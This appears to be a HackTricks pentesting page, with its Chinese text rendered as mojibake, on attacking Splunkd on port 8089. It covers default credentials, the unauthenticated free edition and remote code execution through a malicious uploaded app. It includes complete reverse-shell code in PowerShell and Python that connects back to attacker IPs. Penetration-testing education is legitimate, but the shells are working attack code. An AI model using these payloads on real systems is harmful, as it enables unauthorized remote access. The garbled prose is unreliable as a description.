# 8089 - Pentesting Splunkd

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## **åŸºæœ¬ä¿¡æ¯**

* ç”¨äºæ•°æ®æ”¶é›†ã€åˆ†æå’Œå¯è§†åŒ–çš„æ—¥å¿—åˆ†æå·¥å…·
* å¸¸ç”¨äºå®‰å…¨ç›‘æ§å’Œä¸šåŠ¡åˆ†æ
* é»˜è®¤ç«¯å£ï¼š
* Web æœåŠ¡å™¨ï¼š8000
* Splunkd æœåŠ¡ï¼š8089

### æ¼æ´å‘é‡ï¼š

1. å…è´¹ç‰ˆæœ¬åˆ©ç”¨

* è¯•ç”¨ç‰ˆåœ¨ 60 å¤©åè‡ªåŠ¨è½¬æ¢ä¸ºå…è´¹ç‰ˆ
* å…è´¹ç‰ˆç¼ºä¹èº«ä»½éªŒè¯
* å¦‚æœä¸åŠ ä»¥ç®¡ç†ï¼Œå¯èƒ½å­˜åœ¨å®‰å…¨é£é™©
* ç®¡ç†å‘˜å¯èƒ½ä¼šå¿½è§†å®‰å…¨éšæ‚£

2. å‡­è¯å¼±ç‚¹

* æ—§ç‰ˆæœ¬ï¼šé»˜è®¤å‡­è¯ `admin:changeme`
* æ–°ç‰ˆæœ¬ï¼šå®‰è£…æ—¶è®¾ç½®å‡­è¯
* å¯èƒ½ä½¿ç”¨å¼±å¯†ç ï¼ˆä¾‹å¦‚ï¼Œ`admin`ã€`Welcome`ã€`Password123`ï¼‰

3. è¿œç¨‹ä»£ç æ‰§è¡Œæœºä¼š

* å¤šç§ä»£ç æ‰§è¡Œæ–¹æ³•ï¼š
* æœåŠ¡å™¨ç«¯ Django åº”ç”¨
* REST ç«¯ç‚¹
* è„šæœ¬è¾“å…¥
* è­¦æŠ¥è„šæœ¬
* è·¨å¹³å°æ”¯æŒï¼ˆWindows/Linuxï¼‰
* è„šæœ¬è¾“å…¥å¯ä»¥è¿è¡Œï¼š
* Bash è„šæœ¬
* PowerShell è„šæœ¬
* æ‰¹å¤„ç†è„šæœ¬

å…³é”®åˆ©ç”¨æ½œåŠ›ï¼š

* æ•æ„Ÿæ•°æ®å­˜å‚¨
* å…è´¹ç‰ˆç¼ºä¹èº«ä»½éªŒè¯
* å¤šç§æ½œåœ¨è¿œç¨‹ä»£ç æ‰§è¡Œå‘é‡
* åˆ©ç”¨è„šæœ¬è¾“å…¥è¿›è¡Œç³»ç»Ÿå¦¥åçš„å¯èƒ½æ€§

### Shodan

* `Splunk build`

## RCE

### åˆ›å»ºè‡ªå®šä¹‰åº”ç”¨

Splunk æä¾›äº†ä¸€ç§é€šè¿‡è‡ªå®šä¹‰åº”ç”¨éƒ¨ç½²è¿›è¡Œè¿œç¨‹ä»£ç æ‰§è¡Œçš„å¤æ‚æ–¹æ³•ï¼Œåˆ©ç”¨å…¶è·¨å¹³å°è„šæœ¬èƒ½åŠ›ã€‚æ ¸å¿ƒåˆ©ç”¨æŠ€æœ¯å›´ç»•åˆ›å»ºä¸€ä¸ªæ¶æ„åº”ç”¨ï¼Œè¯¥åº”ç”¨å¯ä»¥åœ¨ Windows å’Œ Linux ç³»ç»Ÿä¸Šæ‰§è¡Œåå‘ shellã€‚

è‡ªå®šä¹‰åº”ç”¨å¯ä»¥è¿è¡Œ **Pythonã€Batchã€Bash æˆ– PowerShell è„šæœ¬**ã€‚æ­¤å¤–ï¼Œ**Splunk è‡ªå¸¦ Python**ï¼Œå› æ­¤å³ä½¿åœ¨ **Windows** ç³»ç»Ÿä¸Šï¼Œæ‚¨ä¹Ÿèƒ½å¤Ÿè¿è¡Œ Python ä»£ç ã€‚

æ‚¨å¯ä»¥ä½¿ç”¨ [**è¿™ä¸ª**](https://github.com/0xjpuff/reverse_shell_splunk) ç¤ºä¾‹ï¼Œå…¶ä¸­ **`bin`** åŒ…å« [Python](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/rev.py) å’Œ [PowerShell](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/run.ps1) çš„ç¤ºä¾‹ã€‚æˆ–è€…æ‚¨å¯ä»¥åˆ›å»ºè‡ªå·±çš„ã€‚

åˆ©ç”¨è¿‡ç¨‹åœ¨å„ä¸ªå¹³å°ä¸Šéµå¾ªä¸€è‡´çš„æ–¹æ³•è®ºï¼š
```
splunk_shell/
â”œâ”€â”€ bin        (reverse shell scripts)
â””â”€â”€ default    (inputs.conf configuration)
```
å…³é”®é…ç½®æ–‡ä»¶ `inputs.conf` é€šè¿‡ä»¥ä¸‹æ–¹å¼å¯ç”¨è„šæœ¬ï¼š

* è®¾ç½® `disabled = 0`
* é…ç½® 10 ç§’çš„æ‰§è¡Œé—´éš”
* å®šä¹‰è„šæœ¬çš„æºç±»å‹

éƒ¨ç½²è¿‡ç¨‹å¾ˆç®€å•ï¼š

1. åˆ›å»ºæ¶æ„åº”ç”¨ç¨‹åºåŒ…
2. åœ¨æ”»å‡»æœºå™¨ä¸Šè®¾ç½®ç›‘å¬å™¨ (Netcat/socat)
3. é€šè¿‡ Splunk çš„ç•Œé¢ä¸Šä¼ åº”ç”¨ç¨‹åº
4. åœ¨ä¸Šä¼ æ—¶è§¦å‘è‡ªåŠ¨è„šæœ¬æ‰§è¡Œ

ç¤ºä¾‹ Windows PowerShell åå‘ shellï¼š
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush()
};
$client.Close()
```
ç¤ºä¾‹ Linux Python åå‘ shell:
```python
import sys, socket, os, pty
ip = "10.10.14.15"
port = "443"
s = socket.socket()
s.connect((ip, int(port)))
[os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]
pty.spawn('/bin/bash')
```
### RCE & Privilege Escalation

åœ¨ä»¥ä¸‹é¡µé¢ä¸­ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°å¦‚ä½•æ»¥ç”¨æ­¤æœåŠ¡ä»¥æå‡æƒé™å¹¶è·å¾—æŒä¹…æ€§çš„è§£é‡Šï¼š

{% content-ref url="../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md" %}
[splunk-lpe-and-persistence.md](../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md)
{% endcontent-ref %}

## References

* [https://academy.hackthebox.com/module/113/section/1213](https://academy.hackthebox.com/module/113/section/1213)

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
